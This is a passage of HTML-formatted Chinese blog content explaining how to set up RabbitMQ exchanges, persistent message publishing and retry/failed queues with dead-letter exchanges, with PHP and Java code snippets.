class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p>PHP代码</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623eb2c51bb351366556\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n// 普通交换机\r\n$this-&gt;channel-&gt;exchange_declare('master', 'topic', false, true, false);\r\n// 重试交换机\r\n$this-&gt;channel-&gt;exchange_declare('master.retry', 'topic', false, true, false);\r\n// 失败交换机\r\n$this-&gt;channel-&gt;exchange_declare('master.failed', 'topic', false, true, false);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51bb351366556-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51bb351366556-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51bb351366556-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51bb351366556-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51bb351366556-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51bb351366556-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623eb2c51bb351366556-1\"><span class=\"crayon-c\">// 普通交换机</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51bb351366556-2\"><span class=\"crayon-sy\">$</span><span class=\"crayon-r\">this</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">channel</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">exchange_declare</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'master'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'topic'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51bb351366556-3\"><span class=\"crayon-c\">// 重试交换机</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51bb351366556-4\"><span class=\"crayon-sy\">$</span><span class=\"crayon-r\">this</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">channel</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">exchange_declare</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'master.retry'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'topic'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51bb351366556-5\"><span class=\"crayon-c\">// 失败交换机</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51bb351366556-6\"><span class=\"crayon-sy\">$</span><span class=\"crayon-r\">this</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">channel</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">exchange_declare</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'master.failed'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'topic'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0015 seconds] -->\r\n<p>在RabbitMQ的管理界面中，我们可以看到创建的三个Exchange</p>\n<p><img title=\"-w539\" src=\"https://segmentfault.com/img/remote/1460000014847794\" alt=\"-w539\"></p>\n<h3>消息发布</h3>\n<p>消息发布时，使用<code>basic_publish</code>方法，参数如下</p>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>值</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>message</td>\n<td>–</td>\n<td>发布的消息对象</td>\n</tr>\n<tr>\n<td>exchange</td>\n<td><strong>master</strong></td>\n<td>消息发布到的Exchange</td>\n</tr>\n<tr>\n<td>routing-key</td>\n<td>–</td>\n<td>路由KEY，用于标识消息类型</td>\n</tr>\n<tr>\n<td>mandatory</td>\n<td>false</td>\n<td>是否强制路由，指定了该选项后，如果没有订阅该消息，则会返回路由不可达错误</td>\n</tr>\n<tr>\n<td>immediate</td>\n<td>false</td>\n<td>指定了当消息无法直接路由给消费者时如何处理</td>\n</tr>\n</tbody>\n</table>\n<p>发布消息时，对于<code>message</code>对象，其内容建议使用<strong>json编码后的字符串</strong>，同时消息需要标识以下属性</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623eb2c51c0042580840\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n'delivery_mode'=&gt; 2 // 1为非持久化，2为持久化</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51c0042580840-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623eb2c51c0042580840-1\"><span class=\"crayon-s\">'delivery_mode'</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 1为非持久化，2为持久化</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>Java代码</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623eb2c51c3201326476\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nchannel.basicPublish(\r\n    \"master\", \r\n    routingKey, \r\n    MessageProperties.PERSISTENT_BASIC, // delivery_mode\r\n    message.getBytes()\r\n);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51c3201326476-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51c3201326476-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51c3201326476-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51c3201326476-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51c3201326476-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51c3201326476-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623eb2c51c3201326476-1\"><span class=\"crayon-v\">channel</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">basicPublish</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51c3201326476-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">\"master\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51c3201326476-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">routingKey</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51c3201326476-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">MessageProperties</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">PERSISTENT_BASIC</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// delivery_mode</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51c3201326476-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">message</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getBytes</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51c3201326476-6\"><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>PHP代码</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623eb2c51c7896805942\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$msg = new AMQPMessage($message-&gt;serialize(), [\r\n    'delivery_mode' =&gt; AMQPMessage::DELIVERY_MODE_PERSISTENT,\r\n]);\r\n\r\n$this-&gt;channel-&gt;basic_publish($msg, 'master', $routingKey);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51c7896805942-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51c7896805942-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51c7896805942-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51c7896805942-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51c7896805942-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623eb2c51c7896805942-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">msg</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">AMQPMessage</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">message</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">serialize</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51c7896805942-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">'delivery_mode'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">AMQPMessage</span><span class=\"crayon-o\">::</span><span class=\"crayon-v\">DELIVERY_MODE_PERSISTENT</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51c7896805942-3\"><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51c7896805942-4\"> </div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51c7896805942-5\"><span class=\"crayon-sy\">$</span><span class=\"crayon-r\">this</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">channel</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">basic_publish</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">msg</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'master'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">routingKey</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n<p></p>\n<h3>消息订阅</h3>\n<p>消息订阅的实现相对复杂一些，需要完成队列的声明以及队列和Exchange的绑定。</p>\n<h4>Declare Queue</h4>\n<p>对于每一个订阅消息的服务，都必须创建一个该服务对应的队列，将该队列绑定到关注的路由规则，这样之后，消息生产者将消息投递给Exchange之后，就会按照路由规则将消息分发到对应的队列供消费者消费了。</p>\n<p>消费服务需要declare三个队列</p>\n<ul>\n<li><code>[queue_name]</code> 队列名称，格式符合 <code>[服务名称]@订阅服务标识</code></li>\n<li><code>[queue_name]@retry</code> 重试队列</li>\n<li><code>[queue_name]@failed</code> 失败队列</li>\n</ul>\n<blockquote><p><code>订阅服务标识</code>是客户端自己对订阅的分类标识符，比如用户中心服务（服务名称ucenter），包含两个订阅：user和enterprise，这里两个订阅的队列名称就为 <code>ucenter@user</code>和<code>ucenter@enterprise</code>，其对应的重试队列为 <code>ucenter@user@retry</code>和<code>ucenter@enterprise@retry</code>。</p></blockquote>\n<p>Declare队列时，参数规定规则如下</p>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>值</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>queue</td>\n<td>–</td>\n<td>队列名称</td>\n</tr>\n<tr>\n<td>passive</td>\n<td>false</td>\n<td>队列不存在则创建，存在则直接成功</td>\n</tr>\n<tr>\n<td>durable</td>\n<td>true</td>\n<td>队列持久化</td>\n</tr>\n<tr>\n<td>exclusive</td>\n<td>false</td>\n<td>排他，指定该选项为true则队列只对当前连接有效，连接断开后自动删除</td>\n</tr>\n<tr>\n<td>no-wait</td>\n<td>false</td>\n<td>该方法需要应答确认</td>\n</tr>\n<tr>\n<td>auto-delete</td>\n<td>false</td>\n<td>当不再使用时，是否自动删除</td>\n</tr>\n</tbody>\n</table>\n<p>对于<code>@retry</code>重试队列，需要指定额外参数</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623eb2c51cb817073614\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n'x-dead-letter-exchange' =&gt; 'master'\r\n'x-message-ttl'          =&gt; 30 * 1000 // 重试时间设置为30s</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51cb817073614-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51cb817073614-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623eb2c51cb817073614-1\"><span class=\"crayon-s\">'x-dead-letter-exchange'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'master'</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51cb817073614-2\"><span class=\"crayon-s\">'x-message-ttl'</span><span class=\"crayon-h\">          </span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">30</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1000</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 重试时间设置为30s</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p></p>\n<blockquote><p>这里的两个header字段的含义是，在队列中延迟30s后，将该消息重新投递到<code>x-dead-letter-exchange</code>对应的Exchange中</p></blockquote>\n<p>Java代码</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623eb2c51cf495097658\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n// 声明监听队列\r\nchannel.queueDeclare(\r\n    queueName, // 队列名称\r\n    true,      // durable\r\n    false,     // exclusive\r\n    false,     // autoDelete\r\n    null       // arguments\r\n);\r\nchannel.queueDeclare(queueName + \"@failed\", true, false, false, null);\r\n\r\nMap arguments = new HashMap();\r\narguments.put(\"x-dead-letter-exchange\", exchangeName());\r\narguments.put(\"x-message-ttl\", 30 * 1000);\r\nchannel.queueDeclare(queueName + \"@retry\", true, false, false, arguments);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51cf495097658-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51cf495097658-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51cf495097658-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51cf495097658-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51cf495097658-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51cf495097658-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51cf495097658-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51cf495097658-8\">8</div><div class=\"crayon-num\" 